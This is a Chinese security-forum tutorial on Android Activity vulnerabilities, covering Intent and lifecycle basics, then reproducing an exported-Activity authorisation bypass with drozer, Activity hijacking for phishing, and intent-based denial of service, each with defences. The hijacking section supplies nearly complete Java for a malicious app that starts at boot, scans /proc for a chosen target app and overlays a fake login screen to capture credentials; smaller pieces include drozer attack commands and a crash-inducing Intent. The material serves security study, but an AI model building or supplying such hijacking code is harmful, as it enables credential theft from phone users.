> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-269211.htm)

> [原创]Android APP 漏洞之战（1）——Activity 漏洞挖掘详解

Android APP 漏洞挖掘（1）——Activity 漏洞挖掘讲解
====================================

目录

*   Android APP 漏洞挖掘（1）——Activity 漏洞挖掘讲解
*            [一、前言](#一、前言)
*            [二、Activity 漏洞初步介绍](#二、activity漏洞初步介绍)
*                    [1.Activity 基本介绍](#1.activity基本介绍)
*                            （1）Intent 调用 Activity
*                            [（2）Activity 中传递数据](#（2）activity中传递数据)
*                            [（3）Activity 的生命周期](#（3）activity的生命周期)
*                            [（4）Activity 的启动模式](#（4）activity的启动模式)
*                    2.Activity 漏洞种类和危害
*                            [（1）Activity 的漏洞种类](#（1）activity的漏洞种类)
*                            [（2）Activity 安全场景和危害](#（2）activity安全场景和危害)
*            [三、Activity 漏洞原理分析和复现](#三、activity漏洞原理分析和复现)
*                    [1. 越权绕过](#1.越权绕过)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                            [（3）防护策略](#（3）防护策略)
*                    [2. 钓鱼欺诈 / Activity 劫持](#2.钓鱼欺诈/activity劫持)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                            [（3）安全防护](#（3）安全防护)
*                    [3. 隐私启动 Intent 包含敏感数据](#3.隐私启动intent包含敏感数据)
*                            [（1）原理介绍](#（1）原理介绍)
*                    [4. 拒绝服务攻击](#4.拒绝服务攻击)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                            [（3）安全防护](#（3）安全防护)
*            [四、实验总结](#四、实验总结)
*            [五、参考网址](#五、参考网址)

[](#一、前言)一、前言
-------------

最近在总结 Android APP 漏洞挖掘方面的知识，上篇帖子 [Android 漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF](https://bbs.pediy.com/thread-269196.htm) 向大家初步的介绍了 Android APP 漏洞挖掘过程中常见的工具，这里也是我平时使用过程中比较常用的三套件，今天我们来逐步学习和复现 Android 中 Activity 漏洞挖掘部分知识，每个漏洞挖掘部分，我们都会选择具有代表性的样本案例给大家演示。

[](#二、activity漏洞初步介绍)二、Activity 漏洞初步介绍
--------------------------------------

### 1.Activity 基本介绍

在学习 Activity 的漏洞挖掘之前，我们先对 Activity 的基本运行原理有一个初步的认识

#### （1）Intent 调用 Activity

首先，我们要启动 Activity，完成各个 Activity 之间的交互，我们需要使用 Android 中一个重要的组件 Intent

```
Intent是各个组件之间交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，而且还能在各组件之间传递数据。Intent一般可用于启动Activity、启动Service、发送广播等场景。
Intent有多个构造函数的重载，Intent（Context packageContext,Class cls）//参数1：启动活动的上下文 参数2：想要启动的目标活动
我们构建好一个Intent对象后，只需要使用 startActivity(Intent)来启动就可以了

```

Intent 一般分为显式 Intent 和隐私 Intent：

 

**显示 Intent 打开 Activity：**

```
Intent intent = new Intent(MainActivity.class,SecondActivity.class); //实例化Intent对象
intent.putExtra("et1",et1Str); //使用putExtra传递参数，参数1：键名 参数2：键对应的值 我们可以使用intent.getStringExtra("et1")获取传递的参数
startActivity(intent); //启动Intent，完成从MainActivity类跳转到SecondActivity类

```

**隐式 Intent 打开 Activity:**

 

隐式 Intent 并不指明启动那个 Activity 而是指定一系列的 action 和 category，然后由系统去分析找到合适的 Activity 并打开，action 和 category 一般在 AndroidManifest 中指定

只有`<action>`和`<category>`中的内容能够匹配上 Intent 中指定的 action 和 category 时，这个活动才能响应 Intent

```
Intent intent = Intent("com.example.test.ACTION_START")；
startActivity(intent)；

```

我们这里只传入了`ACTION_START`，这是因为`android.intent.category.DEFAULT`是一种默认的 category，在调用`startActivity()`时会自动将这个 category 添加到 Intent 中，注意：**Intent 中只能添加一个 action，但是可以添加多个 category**

 

对于含多个 category 情况，我们可以使用`addCategory()`方法来添加一个 category

```
intent.addCategory("com.example.test.MY_CATEGORY");

```

**隐私 Intent 打开程序外 Activity：**

 

例如我们调用系统的浏览器去打开百度网址

```
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://www.baidu.com"));
startActivity(intent);

```

`Intent.ACTION_VIEW`是系统内置的动作，然后将`https://www.baidu.com`通过`Uri.parse()`转换成 Uri 对象，传递给`intent.setData(Uri uri)`函数

 

与此对应，我们在 <intent-filter> 中配置 < data > 标签，用于更加精确指定当前活动能够响应什么类型的数据：

```
android:scheme：用于指定数据的协议部分，如https
android:host：用于指定数据的主机名部分，如www.baidu.com
android:port：用于指定数据的端口，一般紧随主机名后
android:path：用于指定数据的路径
android:mimeType：用于指定支持的数据类型

```

只有当`<data>`标签中指定的内容和 Intent 中携带的 data 完全一致时，当前 Activity 才能响应该 Intent。下面我们通过设置 data，让它也能响应打开网页的 Intent

我们就能通过隐式 Intent 的方法打开外部 Activity

```
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://www.baidu.com"));
startActivity(intent);

```

#### [](#（2）activity中传递数据)（2）Activity 中传递数据

**向下一个活动传递数据：**

 

Intent 传递字符串：

```
Intent intent = new Intent(MainActivity.class,SecondActivity.class);
intent.putExtra("et1",et1Str);
startActivity(intent);

```

Intent 接收字符串：

```
Intent intent = getIntent();
String data = intent.getStringExtra("et1");

```

**返回数据给上一个活动：**

 

Android 在返回一个活动可以通过 Back 键，也可以使用`startActivityForResult()`方法来启动活动，该方法在活动销毁时能返回一个结果给上一个活动

```
Intent intent = new Intent(MainActivity.class,SecondActivity.class);
startActivityForResult(intent,1); //参数1：Intent  参数2：请求码,用于之后回调中判断数据来源

```

我们在 SecondActivity 中返回数据

```
Intent intent = new Intent();
intent.putExtra("data",data);
setResult(RESULT_OK,intent);  //setResult接收两个参数，参数1：向上一个活动返回处理结果，RESULT_OK或RESULT_CANCELED 参数2：把带数据Intent返回出去
finish();  //销毁当前活动

```

当活动销毁后，就会回调到上一个活动，所以我们需要在 MainActivity 中接收

```
@Override
   protected void onActivityResult(int requestCode, int resultCode,  Intent data) {  // 参数1：我们启动活动的请求码 参数2：我们返回数据时传入结果  参数3：携带返回数据的Intent
       super.onActivityResult(requestCode, resultCode, data);
       switch (requestCode){
           case  1:
               if(requestCode == RESULT_OK){
                   String returnData =data.getStringExtra("data");
               }
               break;
           default:
       }
   }

```

如果我们要实现 Back 返回 MainActivity，我们需要在 SecondActivity 中重写 onBackPressed() 方法

```
@Override
  public void onBackPressed() {
      super.onBackPressed();
      Intent intent = new Intent();
      intent.putExtra("data","data");
      setResult(RESULT_OK,intent);
      finish();
  }

```

#### [](#（3）activity的生命周期)（3）Activity 的生命周期

Activity 类中定义了 7 个回调方法，覆盖了 Activity 声明周期的每一个环节：

```
onCreate()： 在Activity第一次创建时调用
onStart():在Activity可见但是没有焦点时调用
onResume():在Activity可见并且有焦点时调用
onPause()：这个方法会在准备启动或者恢复另一个Activity时调用，我们通常在该方法中释放消耗CPU的资源或者保存数据，但在该方法内不能做耗时操作，否则影响另一个另一个Activity的启动或恢复。
onStop()：在Activity不可见时调用，它和onPause主要区别就是：onPause在失去焦点时会调用但是依然可见，而onStop是完全不可见。
onDestory()：在Activity被销毁前调用
onRestart()：在Activity由不在栈顶到再次回到栈顶并且可见时调用。

```

生命周期调用图：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_RVD8D8CYTXJTYR4.png)

```
我们可以将活动分为3中生存期：
    （1）完整生存期：活动在onCreate()和onDestroy()方法之间所经历的，从开始初始化到完成释放内存
    （2）可见生存期：活动在onStart()和onStop()方法之间所经历的，主要包括资源的加载和资源的释放
    （3）前台生存期：活动在onResume()方法和onPause()方法之间所经历的，主要是Activity的运行

```

#### [](#（4）activity的启动模式)（4）Activity 的启动模式

我们这里之所以要介绍 Activity 的启动模式，是因为 Activity 界面劫持就是根据 Activity 的运行特点所实现的

 

Activity 一共有四种启动模式：standard 模式、singleTop 模式、singleTask 模式、singleInstance 模式。下面我们简单介绍一下：

 

**standard 模式**

 

如果不显示指定启动模式，那么 Activity 的启动模式就是 standard，在该模式下不管 Activity 栈中有无 Activity，均会创建一个新的 Activity 并入栈，并处于栈顶的位置

 

**singleTop 模式**

```
（1）启动一个Activity，这个Activity位于栈顶，则不会重新创建Activity,而直接使用，此时也不会调用Activity的onCreate()，因为并没有重新创建Activity
     Activity生命周期：
    onPause----->onNewIntent------>onResume
    这个过程中调用了 onNewIntent(intent: Intent?),我们可以在该函数中通过Intent获取新传递过来的数据，因为此时数据可能已经发生变化
 (2) 要启动的Activity不在栈顶，那么启动该Activity就会重新创建一个新的Activity并入栈，此时栈中就有2个Activity的实例了

```

**singleTask 模式**

```
如果准备启动的ActivityA的启动模式为singleTask的话，那么会先从栈中查找是否存在ActivityA的实例：
场景一、如果存在则将ActivityA之上的Activity都出栈，并调用ActivityA的onNewIntent()
       ActivityA启动ActivityB,然后启动ActivityA，此时生命周期过程：
       ActivityB onPause----->ActivityA(onRestart--->onStart--->onNewIntent--->onResume)--------->ActivityB(onStop--->onDestroy)
 
场景二、如果ActivityA位于栈顶，则直接使用并调用onNewInent()，此时和singleTop一样
       ActivityA启动ActivityA，此时生命周期过程:
       ActivityA(onPause--->onNewIntent--->onResume)
 
场景三、 如果栈中不存在ActivityA的实例则会创建一个新的Activity并入栈。
       ActivityA启动ActivityB,此时生命周期过程：
       ActivityA(onCreate--->onStart--->onResume)

```

**singleInstance 模式**

```
指定singleInstance模式的Activity会启动一个新的返回栈来管理这个Activity（其实如果singleTask模式指定了不同的taskAffinity，也会启动一个新的返回栈
我们可以通过这种模式去实现其他程序和我们程序能共享这个Activity实例，在这种模式下，会有一个单独的返回栈来管理这个Activity，无论哪个应用程序来访问这个Activity，都在同一个返回栈中，也就解决了共享Activity实例的问题

```

### 2.Activity 漏洞种类和危害

我们在上文中详细介绍了 Activity 的运行原理，接下来我们了解一些 Activity 的漏洞种类和应用的安全场景

#### [](#（1）activity的漏洞种类)（1）Activity 的漏洞种类

![](https://bbs.pediy.com/upload/attach/202109/905443_SEK8YFRNTN3AYFB.png)

#### [](#（2）activity安全场景和危害)（2）Activity 安全场景和危害

```
Activity的组件导出，一般会导致的问题：Android Browser Intent Scheme URLs的攻击手段
(1)拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验
(2)越权攻击：Activity用户界面绕过会造成用户信息窃取、Activity界面被劫持产生欺诈等安全事件
(3)组件导出导致钓鱼欺诈
(4)隐式启动intent包含敏感数据

```

[](#三、activity漏洞原理分析和复现)三、Activity 漏洞原理分析和复现
--------------------------------------------

### 1. 越权绕过

#### [](#（1）原理介绍)（1）原理介绍

```
在Android系统中，Activity默认是不导出的，如果设置了exported = "true" 这样的关键值或者是添加了这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。
例如：
(1)一些敏感的界面需要用户输入密码才能查看，如果没有对调用此Activity的组件进行权限验证，就会造成验证的越权问题，导致攻击者不需要密码就可以打开
(2)通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务
(3)对Activity界面进行劫持 
```

#### [](#（2）漏洞复现)（2）漏洞复现

样本 sieve.apk drozer.apk

 

![](https://bbs.pediy.com/upload/attach/202109/905443_5J2UBVB9WHPWZBD.png)

 

首先，我们需要配置 drozer 的基本环境，具体配置操作，参考：[Android 漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF](https://bbs.pediy.com/thread-269196.htm)

 

手机端打开代理，开启 31415 端口

```
adb forward tcp:31415 tcp:31415
drozer console connect

```

![](https://bbs.pediy.com/upload/attach/202109/905443_SGDEJQWJS4VHZXG.png)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_EYZABYG4VN5WNSZ.png)

 

我们尝试使用 drozer 去越权绕过该界面，首先，我们先列出程序中所有的 APP 包

```
run app.package.list

```

我们通过查询字段，可以快速定位到 sieve 的包名

 

![](https://bbs.pediy.com/upload/attach/202109/905443_MS6238UCBPJKWMX.png)

 

然后，我们去查询目标应用的攻击面

```
run app.package.attacksurface com.mwr.example.sieve

```

![](https://bbs.pediy.com/upload/attach/202109/905443_DQXBFAUXQWH5H2J.png)

 

我们可以看出，有三个 activity 是被导出的，我们再具体查询暴露 activity 的信息

```
run app.activity.info -a  com.mwr.example.sieve

```

![](https://bbs.pediy.com/upload/attach/202109/905443_FPG5WCPDAZPCUJA.png)

 

说明我们可以通过强制跳转其他两个界面，来实现越权绕过

```
run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList

```

![](https://bbs.pediy.com/upload/attach/202109/905443_KX7XCTFS5DHH54W.png)

 

说明我们成功的实现了越权绕过

#### [](#（3）防护策略)（3）防护策略

```
防护策略：
(1)私有Activity不应被其他应用启动相对是安全的，创建activity时：设置exported属性为false
(2)公开暴露的Activity组件，可以被任意应用启动，创建Activity：设置export属性为true，谨慎处理接收的Intent，有返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理

```

### 2. 钓鱼欺诈 / Activity 劫持

#### [](#（1）原理介绍)（1）原理介绍

```
原理介绍：
（1）Android APP中不同界面的切换通过Activity的调度来实现，而Acticity的调度是由Android系统中的AMS来实现。每个应用想启动或停止一个进程，都报告给AMS，AMS收到启动或停止Activity的消息时，先更新内部记录，再通知相应的进程或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity会保留在系统中的一个Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back，顶部的Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。
（2）由于Activity的这种特性，如果在启动一个Activity时，给它加入一个标志位FLAGACTIVITYNEW_TASK,就能使它置于栈顶并立马呈现给用户，如果这个Activity是用于盗号的伪装Activity，就会产生钓鱼安全事件或者一个Activity中有webview加载，允许加载任意网页都有可能产生钓鱼事件。
 
实现原理：
如果我们注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；这个service，会启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，截获正常应用的登录凭证
 
实现步骤：
(1)启动一个服务
(2)不断扫描当前进程
(3)找到目标后弹出伪装窗口

```

![](https://bbs.pediy.com/upload/attach/202109/905443_VXTN2CAWCG95V6Z.png)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_GGBXXNKHXCFPKPD.png)

#### [](#（2）漏洞复现)（2）漏洞复现

在进行 Android 界面劫持过程中，我发现根据 Android 版本的变化情况，目前不同 Android 版本实现的功能代码有一定的差异性，再经过多次的学习和总结后，我复现而且改进了针对 Android 6.0 界面劫持的功能代码，并对不同版本的页面劫持做了一个初步的总结，下面是具体实验的详细过程:

 

首先我们新建一个服务类 HijackingService.class，然后在 MainActivity 里面启动这个服务类

```
public class MainActivity extends AppCompatActivity {
 
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent2 = new Intent(this,HijackingService.class);
        startService(intent2);
        Log.w("hijacking","activity启动用来劫持的Service");
    }
}

```

我们可以看到程序一旦启动，就会启动 HijackingService.class

 

然后我们编写一个 HijackingApplication 类，主要负责添加劫持类别，清除劫持类别，判断是否已经劫持

```
public class HijackingApplication{ 
    private static List hijackings = new ArrayList(); 
 
    public static void addProgressHijacked(String paramString){    //添加劫持进程
       hijackings.add(paramString); 
    } 
 
    public static void clearProgressHijacked(){       //清楚劫持进程集合
       hijackings.clear(); 
    } 
 
    public static boolean hasProgressBeHijacked(String paramString){    //判断该进程是否被劫持
       return hijackings.contains(paramString); 
    } 
} 
```

说明：这个类的主要功能是，保存已经劫持过的包名，防止我们多次劫持增加暴露风险。

 

我们为了实现开机启动服务，新建一个广播类：

```
public class HijackingReciver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals("android.intent.action.BOOT_COMPLETED")){
            Log.w("hijacking","开机启动");
            Intent intent2 = new Intent(context,HijackingService.class);
            context.startService(intent2);
            Log.w("hijacking","启动用来劫持的Service");
        }
 
    }
}

```

然后我们编写劫持类 HijackingService.class

```
private boolean hasStart = false;
    private boolean isStart;
    HashMap> map = new HashMap>();
    //新建线程
    Handler handler = new Handler();
    Runnable mTask = new Runnable() {
        @Override
        public void run() {
            Log.w("TAG","ABC");
            int i =1;
            //ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            //List appProcessInfos = activityManager.getRunningAppProcesses();
          //  List appProcessInfos = ((ActivityManager) HijackingService.this.getSystemService(Context.ACTIVITY_SERVICE)).getRunningAppProcesses();
           //String Processesnew = ForegroundProcess.getForegroundApp();
           //Log.w("TAG============",Processesnew);
           List Processes = AndroidProcesses.getRunningAppProcesses();
            Log.w("hijacking", "=================正在枚举进程=======================");
            //枚举进程
            for( AndroidAppProcess appProcessInfo: Processes){
                Log.w("TAG",appProcessInfo.name);
                /*try {
                    Stat stat = appProcessInfo.stat();
                    int pid = stat.getPid();
                    int parentProcessId = stat.ppid();
                    long startTime = stat.stime();
                    int policy = stat.policy();
                    char state = stat.state();
                    Log.w("TAG","pid："+pid+" parentProcessId:"+parentProcessId+" startTime:"+startTime+" policy:"+policy+" state:"+state);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                */
 
                String ProcessesRunning = ForegroundProcess.getForegroundApp();
                Log.w("TAG============",ProcessesRunning);
                if(map.containsKey(ProcessesRunning)) {
                    // Log.w("TAG","GHZ");
                    //如果包含在我们劫持的map中
                    if (map.containsKey(appProcessInfo.name)) {
                        Log.w("准备劫持", appProcessInfo.name);
                        hijacking(appProcessInfo.name);
                    } else {
                        //Log.w("hijacking",appProcessInfo.getPackageName());
                        //Log.w("abc","123");
                    }
                }
 
            }
            handler.postDelayed(mTask,8000);
        }
        private void hijacking(String progressName){
            //判断是否已经劫持，对劫持的过的程序跳过
            if(!HijackingApplicaiton.hasProgressBeHijacked(progressName)){
                Intent localIntent = new Intent(HijackingService.this.getBaseContext(),HijackingService.this.map.get(progressName));
                localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                HijackingService.this.getApplication().startActivity(localIntent);
                HijackingApplicaiton.addProgressHijacked(progressName);
                Log.w("TAG====hijacking","已经劫持成功");
            }
        }
    };
 
    @Override
    public void onCreate() {
        super.onCreate();
        if(!isStart){
            map.put("com.cz.babySister",SecondActivity.class);
            this.handler.postDelayed(this.mTask, 1000);
            isStart = true;
        }
 
    }
 
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
 
    @Override
    public  boolean stopService(Intent name){
        hasStart = false;
        Log.w("TAG====hijacking","劫持服务停止");
        HijackingApplicaiton.clearProgressHijacked();
        return super.stopService(name);
    } 
```

我们编写劫持类中，最关键的就是如何获取当前的前台进程和遍历正在运行的进程，这也是 Android 版本更新后，导致不同版本劫持差异的主要原因，对这里我做了一个初步的总结：

```
注意：
    (1)我们实现界面劫持，主要是根据Android Activity设计的漏洞，而这就会涉及对ActivityManager的掌握
       网址：https://blog.csdn.net/zhangxunxyy/article/details/80805394
    (2)Android 获取当前的Activity，因为Android版本不同而具备一定差异性
 
       1)Android 5.0之前可以使用getRunningTasks,该方法可以获得在前台运行的系统进程
       2)Android 5.0-6.0 getRunningTasks失效，可以使用getRunningAppProcesses方法暂时替代
       3)Android 6.0以上 getRunningAppProcess也失效了，系统关闭了三方软件对系统进程的访问
            目前的方法:
            1.使用国外大佬的代码 AndroidProcesses
            参考网址：https://github.com/jaredrummler/AndroidProcesses
                       https://jaredrummler.com/2017/09/13/android-processes/
                       https://www.itranslater.com/qa/details/2325835735628252160
            2.使用第三方开源库：libsuperuser
            使用文章：https://blog.csdn.net/daydayplayphone/article/details/52236148
            开源网址：https://github.com/Chainfire/libsuperuser
            第三种方法主要是利用Google 应用程序可以访问 /proc/
            https://blog.csdn.net/brycegao321/article/details/76966424
       4)我们发现使用这两种方法都只能列出进程列表，并不能获取正在运行的进程，我们需要进一步过滤
            参考网址：https://blog.csdn.net/dq1005/article/details/51453121
                       https://www.jianshu.com/p/f3aea648dfbb
            如何判断Android包名获取进程是否存活：https://blog.csdn.net/weixin_39352694/article/details/83620517
            如何查看前台进程的六种方法：https://github.com/wenmingvs/AndroidProcess

```

我们编写获取当前目标进程的代码：

```
public class ForegroundProcess {
    public static final int AID_APP = 10000;
    public static final int AID_USER = 100000;
 
    public static String getForegroundApp() {
        File[] files = new File("/proc").listFiles();
        int lowestOomScore = Integer.MAX_VALUE;
        String foregroundProcess = null;
        for (File file : files) {
            if (!file.isDirectory()) {
                continue;
            }
            int pid;
 
            try {
                pid = Integer.parseInt(file.getName());
            } catch (NumberFormatException e) {
                continue;
            }
 
            try {
                String cgroup = read(String.format("/proc/%d/cgroup", pid));
                String[] lines = cgroup.split("\n");
                String cpuSubsystem;
                String cpuaccctSubsystem;
 
                if (lines.length == 2) {// 有的手机里cgroup包含2行或者3行，我们取cpu和cpuacct两行数据
                    cpuSubsystem = lines[0];
                    cpuaccctSubsystem = lines[1];
                } else if (lines.length == 3) {
                    cpuSubsystem = lines[0];
                    cpuaccctSubsystem = lines[2];
                } else {
                    continue;
                }
 
                if (!cpuaccctSubsystem.endsWith(Integer.toString(pid))) {
                    // not an application process
                    continue;
                }
                if (cpuSubsystem.endsWith("bg_non_interactive")) {
                    // background policy
                    continue;
                }
 
                String cmdline = read(String.format("/proc/%d/cmdline", pid));
                if (cmdline.contains("com.android.systemui")) {
                    continue;
                }
                int uid = Integer.parseInt(cpuaccctSubsystem.split(":")[2]
                        .split("/")[1].replace("uid_", ""));
                if (uid >= 1000 && uid <= 1038) {
                    // system process
                    continue;
                }
                int appId = uid - AID_APP;
                int userId = 0;
                // loop until we get the correct user id.
                // 100000 is the offset for each user.
 
                while (appId > AID_USER) {
                    appId -= AID_USER;
                    userId++;
                }
 
                if (appId < 0) {
                    continue;
                }
                // u{user_id}_a{app_id} is used on API 17+ for multiple user
                // account support.
                // String uidName = String.format("u%d_a%d", userId, appId);
                File oomScoreAdj = new File(String.format(
                        "/proc/%d/oom_score_adj", pid));
                if (oomScoreAdj.canRead()) {
                    int oomAdj = Integer.parseInt(read(oomScoreAdj
                            .getAbsolutePath()));
                    if (oomAdj != 0) {
                        continue;
                    }
                }
                int oomscore = Integer.parseInt(read(String.format(
                        "/proc/%d/oom_score", pid)));
                if (oomscore < lowestOomScore) {
                    lowestOomScore = oomscore;
                    foregroundProcess = cmdline;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return foregroundProcess;
 
    }
 
    private static String read(String path) throws IOException {
        StringBuilder output = new StringBuilder();
        BufferedReader reader = new BufferedReader(new FileReader(path));
        output.append(reader.readLine());
 
        for (String line = reader.readLine(); line != null; line = reader
                .readLine()) {
            output.append('\n').append(line);
        }
        reader.close();
        return output.toString().trim();// 不调用trim()，包名后会带有乱码
    }
 
}

```

我们继续编写劫持替换的测试类

```
public class SecondActivity extends AppCompatActivity {
    private static Boolean flag ;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);
        Log.w("TAGSecod","切换");
        EditText name = findViewById(R.id.editTextTextPersonName);
        EditText passward = findViewById(R.id.editTextTextPassword);
        Button button = findViewById(R.id.button);
            button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Log.w("TAG", "成功劫持进入该界面");
                    flag =false;
                }
            });
 
    }
}

```

最后在我们的配置文件中加入相应的权限和配置信息：

我们需要将服务的时间设置成 6 秒，避免程序界面还未加载就劫持了

 

**效果演示：**

 

我们编写劫持类安装，打开：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_PWWKGDWZH58HZQX.png)

 

我们可以发现劫持类在后台运行：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_KCE6DPDEYYPH88N.png)

 

我们打开目标程序：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_36ZC67RKXT6C7WJ.png)

 

等待 5 秒，然后劫持成功，这个时间我们可以在代码段调整：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_AJDZTS8JGR3TZME.png)

 

这样我们成功完成了对目标程序劫持，这里我只编写了一个简易的界面，大家可以编写更加复杂的界面，这主要是针对 Android 6.0 平台的劫持，各位也可以试试其他版本的平台

#### [](#（3）安全防护)（3）安全防护

```
如果真的爆发了这种恶意程序，我们并不能在启动程序时每一次都那么小心去查看判断当前在运行的是哪一个程序，当android:noHistory="true"时上面的方法也无效
目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。
梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。
参考网址：https://blog.csdn.net/ruingman/article/details/51146152
          http://blog.chinaunix.net/uid-16728139-id-4962659.html
          https://blog.csdn.net/u012195899/article/details/70172241?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-9.essearch_pc_relevant&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-9.essearch_pc_relevant

```

![](https://bbs.pediy.com/upload/attach/202109/905443_UMEKKKY2RDTQR9B.png)

 

通过它提示程序进入后台来提示用户

### 3. 隐私启动 Intent 包含敏感数据

#### [](#（1）原理介绍)（1）原理介绍

```
1.背景知识：Intent可分为隐私(implicitly)和显式(explicitly)两种
(1)显式Intent：即在构造Intent对象时就指定接收者，它一般用在知道目标组件名称的前提下，
   一般是在相同的应用程序内部实现的，如下：
   Intent intent = new Intent(MainActivit.this, NewActivity.class);
   startActivity(intent);
(2)隐式Intent：即Intent的发送者在构造Intent对象时，并不知道也不关心接收者是谁，有利于
降低发送者和接收者之间的耦合，它一般用在没有明确指出目标组件名称的1前提下，一般是用于
不同应用程序之间，如下：
    Intent intent = new Intent();
    intent.setAction("com.wooyun.test");
    startActivity(intent);
对于显式Intent，Android不需要去做解析，因为目标组件已经很明确，Android需要解析的是那些
隐式Intent,通过解析，将Intent映射给可以处理此Intent的Activity，IntentReceiver或Service

```

![](https://bbs.pediy.com/upload/attach/202109/905443_X25ZNSSHGKTPNWX.png)

```
我们有一个应用A,采用Intent隐式传递,它的动作是"X",此时还有一个应用B,动作也是X,我们在启动的时候，通过Intent隐式传递，就会同时弹出两个界面，我们就不知道到底启动A还是B

```

因为现在这种漏洞在 Android 版本更新后，基本很少出现了，所以这里就不做复现和安全防护了

### 4. 拒绝服务攻击

#### [](#（1）原理介绍)（1）原理介绍

```
原理介绍：
  Android提供Intent机制来协助应用间的交互和通讯，通过Intent实现对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android通过Intent的描述，负责找到对应组件，完成调用。
  拒绝服务攻击源于程序没有对Intent。getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用发送此类空数据、异常或者畸形数据来达到致使该应用crash的目的，我们可以通过intent发送空数据、异常或畸形数据给正常应用，导致其崩溃。本地拒绝服务可以被竞争方利用来攻击，使得自己的应用崩溃，造成破坏。
  危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的

```

提到拒绝服务攻击，我们就不得不讲一下 Android 外部程序的调用方法：

```
总结：
    1.使用自定义Action
    A程序中调用的代码为：
      Intent intent = new Intent();
      intent.setAction("com.test.action.PLAYER");              
      startActivity(intent);
    B程序中的AndroidManifest.xml中启动Activity的intent-filter
     
 
    2.使用包类名
    A程序中调用的代码为：
     Intent intent = new Intent();
     intent.setClassName("com.test", "com.test.Player");//目标程序包名、主进程名
     startActivity(intent);
    intent.setClassName(arg1,arg2)中arg1是被调用程序B的包名，arg2是B程序中目的activity的完整类名
 
    或者使用ComponentName
     Intent intent = new Intent();        
     ComponentName comp = new ComponentName("com.test", "com.test.Player" ); //目标程序包名、主进程名
     intent.setComponent(comp);
     startActivity(intent);
 
     B程序被调用中AndroidManifest.xml中启动Activity的intent-filter不需要特别加入其它信息，如下即可：
        

```

#### [](#（2）漏洞复现)（2）漏洞复现

我们查看一个目标应用的 AndroidManifest.xml 文件：

我们编写一个简易的 APP 程序，对目标程序进行拒绝服务攻击

```
Intent intent = new Intent();
ComponentName comp = new ComponentName("com.mwr.example.sieve","com.mwr.example.sieve.MainLoginActivity");
intent.putExtra("", "");
intent.setComponent(comp);
startActivity(intent);

```

这里我们传入一个空字符，使其产生错误

 

当然我们还可以使用我们的神器 drozer 来进行攻击

 

![](https://bbs.pediy.com/upload/attach/202109/905443_WBVFP3MYSSQPAW3.png)

 

远程拒绝服务攻击：

```
参考网址： http://rui0.cn/archives/30

```

还有其他类型的拒绝服务攻击，大家可以参考博客：

```
参考网址https://blog.csdn.net/myboyer/article/details/44940811utm_term=Activity%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-44940811&spm=3001.4430

```

#### [](#（3）安全防护)（3）安全防护

```
安全防护：
    （1）空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其它异常
    （2）谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做try/catch处理，以及对不符合预期数据做异常处理
总结：
1.不需要被外部调用的activity设置android:exported="false"；
 
2.若需要外部调用，需自定义signature或者signatureOrSystem级别的权限；
 
3.注册的组件请严格校验输入参数，注意空值判定和类型转换判断

```

[](#四、实验总结)四、实验总结
-----------------

